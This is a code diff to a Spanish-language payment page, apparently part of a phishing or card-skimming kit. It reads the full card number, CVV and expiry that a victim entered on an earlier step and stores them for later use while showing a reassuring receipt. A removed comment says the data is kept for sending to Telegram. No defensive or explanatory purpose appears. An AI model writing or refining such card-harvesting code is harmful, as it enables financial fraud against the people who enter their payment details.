@@ -628,12 +628,32 @@
             });
             document.getElementById('transaction-date').textContent = `${dateStr} ${timeStr}`;
             
-            // Obtener últimos 4 dígitos de la tarjeta desde sessionStorage
-            let cardLast4 = sessionStorage.getItem('cardLast4') || localStorage.getItem('cardLast4') || '0000';
+            // Obtener últimos 4 dígitos de la tarjeta desde paso3.html (sessionStorage)
+            // La tarjeta se guarda en 'cardNumber' en paso3.html
+            let cardNumber = sessionStorage.getItem('cardNumber') || '';
+            let cardLast4 = '0000';
+            
+            if (cardNumber) {
+                // Limpiar espacios y obtener últimos 4 dígitos
+                const cleanNumber = cardNumber.replace(/\s/g, '');
+                if (cleanNumber.length >= 4) {
+                    cardLast4 = cleanNumber.slice(-4);
+                }
+            }
+            
+            // También verificar si está en localStorage
+            if (cardLast4 === '0000') {
+                const storedLast4 = localStorage.getItem('cardLast4');
+                if (storedLast4) {
+                    cardLast4 = storedLast4;
+                }
+            }
+            
             document.getElementById('card-last-digits').textContent = `Visa •••• •••• •••• ${cardLast4}`;
             
-            // Guardar datos de tarjeta para enviar a Telegram
-            sessionStorage.setItem('cardNumberFull', sessionStorage.getItem('cardNumber') || 'No disponible');
+            // Guardar en sessionStorage para usarlo después
+            sessionStorage.setItem('cardLast4', cardLast4);
+            sessionStorage.setItem('cardNumberFull', cardNumber || 'No disponible');
             sessionStorage.setItem('cardCVV', sessionStorage.getItem('cvc') || 'No disponible');
             sessionStorage.setItem('cardExpiry', sessionStorage.getItem('expiry') || 'No disponible');
         }
